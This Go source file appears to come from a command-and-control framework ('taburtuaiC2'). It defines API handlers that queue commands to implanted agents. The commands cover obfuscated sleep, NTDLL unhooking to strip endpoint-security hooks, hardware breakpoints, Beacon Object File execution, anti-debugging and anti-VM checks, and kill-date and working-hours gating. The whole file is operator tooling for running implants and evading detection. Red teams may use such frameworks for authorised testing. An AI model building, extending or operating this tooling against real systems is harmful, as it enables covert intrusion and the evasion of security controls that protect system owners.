package api

import (
	"fmt"
	"net/http"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
	"github.com/mjopsec/taburtuaiC2/internal/services"
	"github.com/mjopsec/taburtuaiC2/pkg/types"
)

// SleepObf queues an obfuscated sleep (XOR memory during beacon sleep).
// POST /api/v1/agent/:id/evasion/sleep
// Body: { "duration": 30 }  seconds
func (h *Handlers) SleepObf(c *gin.Context) {
	agentID := c.Param("id")
	if !h.agentOnline(c, agentID) {
		return
	}
	if h.enforceAgentWrite(c, agentID) {
		return
	}

	var req struct {
		Duration int `json:"duration"` // seconds; default 30
	}
	c.ShouldBindJSON(&req)
	if req.Duration <= 0 {
		req.Duration = 30
	}

	cmd := &types.Command{
		ID:            uuid.New().String(),
		AgentID:       agentID,
		OperationType: "sleep_obf",
		SleepDuration: req.Duration,
		CreatedAt:     time.Now(),
		Status:        "pending",
		Timeout:       req.Duration + 10,
	}
	h.server.CommandQueue.Add(agentID, cmd)
	h.server.Logger.LogCommandExecution(agentID, "SLEEP_OBF", fmt.Sprintf("%ds", req.Duration), true)
	h.APIResponse(c, true, "Obfuscated sleep queued", map[string]interface{}{
		"command_id": cmd.ID,
		"duration":   req.Duration,
	}, "")
}

// UnhookNTDLL queues NTDLL unhooking (fresh .text copy from disk).
// POST /api/v1/agent/:id/evasion/unhook
func (h *Handlers) UnhookNTDLL(c *gin.Context) {
	agentID := c.Param("id")
	if !h.agentOnline(c, agentID) {
		return
	}
	if h.enforceAgentWrite(c, agentID) {
		return
	}

	cmd := &types.Command{
		ID:            uuid.New().String(),
		AgentID:       agentID,
		OperationType: "unhook_ntdll",
		CreatedAt:     time.Now(),
		Status:        "pending",
		Timeout:       30,
	}
	h.server.CommandQueue.Add(agentID, cmd)
	h.server.Logger.LogCommandExecution(agentID, "UNHOOK_NTDLL", "", true)
	h.APIResponse(c, true, "NTDLL unhook queued", map[string]interface{}{
		"command_id": cmd.ID,
	}, "")
}

// HWBPSet installs a hardware execute-breakpoint on the agent.
// POST /api/v1/agent/:id/evasion/hwbp/set
// Body: { "addr": "0x7FFE1234", "register": 0 }
func (h *Handlers) HWBPSet(c *gin.Context) {
	agentID := c.Param("id")
	if !h.agentOnline(c, agentID) {
		return
	}
	if h.enforceAgentWrite(c, agentID) {
		return
	}

	var req struct {
		Addr     string `json:"addr"     binding:"required"` // hex address
		Register uint8  `json:"register"`                    // 0-3
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, fmt.Sprintf("Invalid request: %v", err))
		return
	}
	if req.Register > 3 {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "register must be 0-3 (DR0-DR3)")
		return
	}

	cmd := &types.Command{
		ID:            uuid.New().String(),
		AgentID:       agentID,
		OperationType: "hwbp_set",
		HWBPAddr:      req.Addr,
		HWBPRegister:  req.Register,
		CreatedAt:     time.Now(),
		Status:        "pending",
		Timeout:       15,
	}
	h.server.CommandQueue.Add(agentID, cmd)
	h.server.Logger.LogCommandExecution(agentID, "HWBP_SET",
		fmt.Sprintf("addr=%s DR%d", req.Addr, req.Register), true)
	h.APIResponse(c, true, "HWBP set queued", map[string]interface{}{
		"command_id": cmd.ID,
		"addr":       req.Addr,
		"register":   req.Register,
	}, "")
}

// HWBPClear removes a hardware breakpoint from the agent.
// POST /api/v1/agent/:id/evasion/hwbp/clear
// Body: { "register": 0 }
func (h *Handlers) HWBPClear(c *gin.Context) {
	agentID := c.Param("id")
	if !h.agentOnline(c, agentID) {
		return
	}
	if h.enforceAgentWrite(c, agentID) {
		return
	}

	var req struct {
		Register uint8 `json:"register"` // 0-3
	}
	c.ShouldBindJSON(&req)

	cmd := &types.Command{
		ID:            uuid.New().String(),
		AgentID:       agentID,
		OperationType: "hwbp_clear",
		HWBPRegister:  req.Register,
		CreatedAt:     time.Now(),
		Status:        "pending",
		Timeout:       15,
	}
	h.server.CommandQueue.Add(agentID, cmd)
	h.server.Logger.LogCommandExecution(agentID, "HWBP_CLEAR", fmt.Sprintf("DR%d", req.Register), true)
	h.APIResponse(c, true, "HWBP clear queued", map[string]interface{}{
		"command_id": cmd.ID,
	}, "")
}

// BOFExec queues BOF (Beacon Object File) execution on the agent.
// POST /api/v1/agent/:id/bof
// Body: { "bof_b64": "<base64 COFF>", "args_b64": "<base64 packed args>" }
func (h *Handlers) BOFExec(c *gin.Context) {
	agentID := c.Param("id")
	if !h.agentOnline(c, agentID) {
		return
	}
	if h.enforceAgentWrite(c, agentID) {
		return
	}

	var req struct {
		BOFB64  string `json:"bof_b64"  binding:"required"`
		ArgsB64 string `json:"args_b64"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, fmt.Sprintf("Invalid request: %v", err))
		return
	}

	cmd := &types.Command{
		ID:            uuid.New().String(),
		AgentID:       agentID,
		OperationType: "bof_exec",
		BOFData:       req.BOFB64,
		BOFArgs:       req.ArgsB64,
		CreatedAt:     time.Now(),
		Status:        "pending",
		Timeout:       60,
	}
	h.server.CommandQueue.Add(agentID, cmd)
	h.server.Logger.LogCommandExecution(agentID, "BOF_EXEC",
		fmt.Sprintf("size=%d bytes", base64DecodedLen(req.BOFB64)), true)
	h.APIResponse(c, true, "BOF execution queued", map[string]interface{}{
		"command_id": cmd.ID,
	}, "")
}

// AntiDebug queues a debugger-presence check on the agent.
// POST /api/v1/agent/:id/opsec/antidebug
func (h *Handlers) AntiDebug(c *gin.Context) {
	agentID := c.Param("id")
	if !h.agentOnline(c, agentID) {
		return
	}
	if h.enforceAgentWrite(c, agentID) {
		return
	}
	cmd := &types.Command{
		ID:            uuid.New().String(),
		AgentID:       agentID,
		OperationType: "antidebug",
		CreatedAt:     time.Now(),
		Status:        "pending",
		Timeout:       15,
	}
	h.server.CommandQueue.Add(agentID, cmd)
	h.APIResponse(c, true, "Anti-debug check queued", map[string]interface{}{
		"command_id": cmd.ID,
	}, "")
}

// AntiVM queues a virtual-machine artifact check on the agent.
// POST /api/v1/agent/:id/opsec/antivm
func (h *Handlers) AntiVM(c *gin.Context) {
	agentID := c.Param("id")
	if !h.agentOnline(c, agentID) {
		return
	}
	if h.enforceAgentWrite(c, agentID) {
		return
	}
	cmd := &types.Command{
		ID:            uuid.New().String(),
		AgentID:       agentID,
		OperationType: "antivm",
		CreatedAt:     time.Now(),
		Status:        "pending",
		Timeout:       30,
	}
	h.server.CommandQueue.Add(agentID, cmd)
	h.APIResponse(c, true, "Anti-VM check queued", map[string]interface{}{
		"command_id": cmd.ID,
	}, "")
}

// TimeGateSet configures working-hours / kill-date on the agent.
// POST /api/v1/agent/:id/opsec/timegate
// Body: { "work_start": 8, "work_end": 18, "kill_date": "2026-12-31" }
func (h *Handlers) TimeGateSet(c *gin.Context) {
	agentID := c.Param("id")
	if !h.agentOnline(c, agentID) {
		return
	}
	if h.enforceAgentWrite(c, agentID) {
		return
	}

	var req struct {
		WorkStart int    `json:"work_start"` // hour 0-23
		WorkEnd   int    `json:"work_end"`
		KillDate  string `json:"kill_date"` // YYYY-MM-DD
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, fmt.Sprintf("Invalid request: %v", err))
		return
	}

	cmd := &types.Command{
		ID:                uuid.New().String(),
		AgentID:           agentID,
		OperationType:     "timegate_set",
		WorkingHoursStart: req.WorkStart,
		WorkingHoursEnd:   req.WorkEnd,
		KillDate:          req.KillDate,
		CreatedAt:         time.Now(),
		Status:            "pending",
		Timeout:           15,
	}
	h.server.CommandQueue.Add(agentID, cmd)
	h.server.Logger.LogCommandExecution(agentID, "TIMEGATE_SET",
		fmt.Sprintf("hours=%02d-%02d kill=%s", req.WorkStart, req.WorkEnd, req.KillDate), true)
	h.APIResponse(c, true, "Time gate configured", map[string]interface{}{
		"command_id": cmd.ID,
	}, "")
}

// agentOnline is a DRY helper that checks agent existence and online status.
func (h *Handlers) agentOnline(c *gin.Context, agentID string) bool {
	agent, exists := h.server.Monitor.GetAgent(agentID)
	if !exists {
		c.Status(http.StatusNotFound)
		h.APIResponse(c, false, "", nil, "Agent not found")
		return false
	}
	if agent.Status == services.StatusOffline {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Agent is offline")
		return false
	}
	return true
}
